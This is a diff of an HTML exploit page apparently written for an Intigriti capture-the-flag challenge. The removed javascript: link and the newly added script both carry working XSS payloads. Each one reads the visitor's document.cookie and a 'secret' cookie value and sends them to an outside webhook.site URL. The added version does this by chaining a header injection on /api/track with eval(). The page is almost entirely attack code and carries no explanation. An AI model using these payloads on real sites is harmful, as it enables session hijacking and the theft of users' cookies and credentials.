@@ -5,6 +5,7 @@
     <style>
         body {
             margin: 0;
+            padding: 0;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -20,15 +21,35 @@
             background-color: #4CAF50;
             color: white;
             font-size: 24px;
-            border-radius: 8px;
             text-decoration: none;
-            font-family: Arial, sans-serif;
-            cursor: pointer;
+            border-radius: 8px;
         }
     </style>
 </head>
 <body>
-    <!-- Single link with direct javascript payload -->
-    <a href="javascript:(function(){var d=document,c=d.cookie,i=new Image();i.src='https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a/leak?c='+encodeURIComponent(c)+'&t='+Date.now();d.body.appendChild(i);var s=c.includes('secret=')?c.split('secret=')[1].split(';')[0]:'';try{var dc=atob(s);i=new Image();i.src='https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a/flag?s='+encodeURIComponent(s)+'&d='+encodeURIComponent(dc)+'&f='+(dc.includes(':')?encodeURIComponent(dc.split(':')[1]):'')+'&t='+Date.now();d.body.appendChild(i);}catch(e){}})();">Click Me!</a>
+    <a id="button" href="#">Click Me!</a>
+    
+    <script>
+        window.onload = function() {
+            // Get the button
+            var button = document.getElementById('button');
+            
+            // When clicked, redirect to challenge site with XSS payload
+            button.onclick = function(e) {
+                e.preventDefault();
+                
+                // Create the URL with XSS payload in fragment
+                var targetUrl = 'https://challenge-0325.intigriti.io/note/exploit#' + 
+                    encodeURIComponent('<img src=x onerror="' + 
+                        'fetch(\'/api/track\',{headers:{\'x-user-ip\':\'fetch(\\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a\\\',{method:\\\'POST\\\',body:JSON.stringify({c:document.cookie,s:document.cookie.split(\\\'secret=\\\')[1]?.split(\\\';\\\')[0]}),mode:\\\'no-cors\\\'})\'}})' +
+                        '.then(r=>r.text())' +
+                        '.then(t=>eval(t))' +
+                    '">');
+                
+                // Redirect to the challenge site
+                window.location.href = targetUrl;
+            };
+        };
+    </script>
 </body>
 </html>
